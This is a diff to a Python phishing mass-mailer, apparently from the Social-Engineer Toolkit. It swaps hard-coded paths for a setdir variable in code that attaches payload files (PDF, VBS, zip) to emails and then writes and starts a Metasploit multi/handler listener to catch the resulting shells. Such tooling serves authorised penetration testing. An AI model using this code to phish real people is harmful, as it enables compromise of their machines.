@@ -43,7 +43,7 @@ for line in sendmail_file:
                     subprocess.Popen("/etc/init.d/sendmail start", shell=True).wait()
                 # if not there then prompt user
                 if not os.path.isfile("/etc/init.d/sendmail"):
-                    pause=raw_input("[!] Sendmail was not found. Install it and try again.")
+                    pause=raw_input("[!] Sendmail was not found. Install it and try again. (For Kali: apt-get install sendmail-bin)")
                     sys.exit()
                 smtp = ("localhost")
                 port = ("25")
@@ -84,31 +84,31 @@ meta_path=meta_path()
 print_info("As an added bonus, use the file-format creator in SET to create your attachment.")
 counter=0
 # PDF Previous
-if os.path.isfile("src/program_junk/template.pdf"):
-    if os.path.isfile("src/program_junk/template.rar"):
-        if os.path.isfile("src/program_junk/template.zip"):
+if os.path.isfile(setdir + "/template.pdf"):
+    if os.path.isfile(setdir + "/template.rar"):
+        if os.path.isfile(setdir + "/template.zip"):
             print_warning("Multiple payloads were detected:")
             print ("1. PDF Payload\n2. VBS Payload\n3. Zipfile Payload\n\n")
             choose_payload=raw_input(setprompt("0", ""))
-            if choose_payload=='1': file_format=("src/program_junk/template.pdf")
-            if choose_payload=='2': file_format=("src/program_junk/template.rar")
-            if choose_payload=='3': file_format=("src/program_junk/template.zip")
+            if choose_payload=='1': file_format=(setdir + "/template.pdf")
+            if choose_payload=='2': file_format=(setdir + "/template.rar")
+            if choose_payload=='3': file_format=(setdir + "/template.zip")
             counter=1
 if counter==0:
-    if os.path.isfile("src/program_junk/template.pdf"): file_format=("src/program_junk/template.pdf")
-    if os.path.isfile("src/program_junk/template.rar"): file_format=("src/program_junk/template.rar")
-    if os.path.isfile("src/program_junk/template.zip"): file_format=("src/program_junk/template.zip")
-    if os.path.isfile("src/program_junk/template.doc"): file_format=("src/program_junk/template.doc")
-    if os.path.isfile("src/program_junk/template.rtf"): file_format=("src/program_junk/template.rtf")
-    if os.path.isfile("src/program_junk/template.mov"): file_format=("src/program_junk/template.mov")
+    if os.path.isfile(setdir + "/template.pdf"): file_format=(setdir + "/template.pdf")
+    if os.path.isfile(setdir + "/template.rar"): file_format=(setdir + "/template.rar")
+    if os.path.isfile(setdir + "/template.zip"): file_format=(setdir + "/template.zip")
+    if os.path.isfile(setdir + "/template.doc"): file_format=(setdir + "/template.doc")
+    if os.path.isfile(setdir + "/template.rtf"): file_format=(setdir + "/template.rtf")
+    if os.path.isfile(setdir + "/template.mov"): file_format=(setdir + "/template.mov")
 
 # Determine if prior payload created
-if not os.path.isfile("src/program_junk/template.pdf"):
-    if not os.path.isfile("src/program_junk/template.rar"):
-        if not os.path.isfile("src/program_junk/template.zip"):
-            if not os.path.isfile("src/program_junk/template.doc"):
-                if not os.path.isfile("src/program_junk/template.rtf"):
-                    if not os.path.isfile("src/program_junk/template.mov"):
+if not os.path.isfile(setdir + "/template.pdf"):
+    if not os.path.isfile(setdir + "/template.rar"):
+        if not os.path.isfile(setdir + "/template.zip"):
+            if not os.path.isfile(setdir + "/template.doc"):
+                if not os.path.isfile(setdir + "/template.rtf"):
+                    if not os.path.isfile(setdir + "/template.mov"):
                         print "No previous payload created."
                         file_format=raw_input(setprompt(["1"], "Enter the file to use as an attachment"))
                         if not os.path.isfile("%s" % (file_format)):
@@ -131,8 +131,8 @@ if filename1 == '1' or filename1 == '':
     print_status("Keeping the filename and moving on.")
 if filename1 == '2':
     filename1=raw_input(setprompt(["1"], "New filename"))
-    subprocess.Popen("cp %s src/program_junk/%s 1> /dev/null 2> /dev/null" % (file_format,filename1), shell=True).wait()
-    file_format=("src/program_junk/%s" % (filename1))
+    subprocess.Popen("cp %s %s/%s 1> /dev/null 2> /dev/null" % (file_format,setdir,filename1), shell=True).wait()
+    file_format=("%s/%s" % (setdir,filename1))
     print_status("Filename changed, moving on...")
 
 print ("""
@@ -166,7 +166,7 @@ if option1 == '1' or option1 == '2':
     if template_choice == '1':
         # set path for
         path = 'src/templates/'
-        filewrite=file("src/program_junk/email.templates", "w")
+        filewrite=file(setdir + "/email.templates", "w")
         counter=0
         # Pull all files in the templates directory
         for infile in glob.glob(os.path.join(path, '*.template')):
@@ -179,7 +179,7 @@ if option1 == '1' or option1 == '2':
         # close the file
         filewrite.close()
         # read in formatted filenames
-        fileread=file("src/program_junk/email.templates","r").readlines()
+        fileread=file(setdir + "/email.templates","r").readlines()
         print_info("Available templates:")
         for line in fileread:
             line=line.rstrip()
@@ -380,27 +380,27 @@ if option1 == '2':
         email_num=email_num+1
         print "   Sent e-mail number: " + (str(email_num))
 
-if not os.path.isfile("src/program_junk/template.zip"):
+if not os.path.isfile(setdir + "/template.zip"):
     print_status("SET has finished delivering the emails")
     question1 = yesno_prompt(["1"], "Setup a listener [yes|no]")
     if question1 == 'YES':
-        if not os.path.isfile("src/program_junk/payload.options"):
-            if not os.path.isfile("src/program_junk/meta_config"):
-                if not os.path.isfile("src/program_junk/unc_config"):
+        if not os.path.isfile(setdir + "/payload.options"):
+            if not os.path.isfile(setdir + "/meta_config"):
+                if not os.path.isfile(setdir + "/unc_config"):
                     print_error("Sorry, you did not generate your payload through SET, this option is not supported.")
-        if os.path.isfile("src/program_junk/unc_config"):
-            child=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/unc_config" % (meta_path))
+        if os.path.isfile(setdir + "/unc_config"):
+            child=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/unc_config" % (meta_path,setdir))
             try: child.interact()
             except Exception: child.close()
 
-        if os.path.isfile("src/program_junk/payload.options"):
-            fileopen=file("src/program_junk/payload.options","r").readlines()
+        if os.path.isfile(setdir + "/payload.options"):
+            fileopen=file(setdir + "/payload.options","r").readlines()
             for line in fileopen:
                 line=line.rstrip()
                 line=line.split(" ")
 
             # CREATE THE LISTENER HERE
-            filewrite=file("src/program_junk/meta_config", "w")
+            filewrite=file(setdir + "/meta_config", "w")
             filewrite.write("use exploit/multi/handler\n")
             filewrite.write("set PAYLOAD "+line[0]+"\n")
             filewrite.write("set LHOST "+line[1]+"\n")
@@ -409,7 +409,7 @@ if not os.path.isfile("src/program_junk/template.zip"):
             filewrite.write("set ExitOnSession false\n")
             filewrite.write("exploit -j\n\n")
             filewrite.close()
-            child=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path))
+            child=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/meta_config" % (meta_path,setdir))
             try:
                 child.interact()
             except Exception:
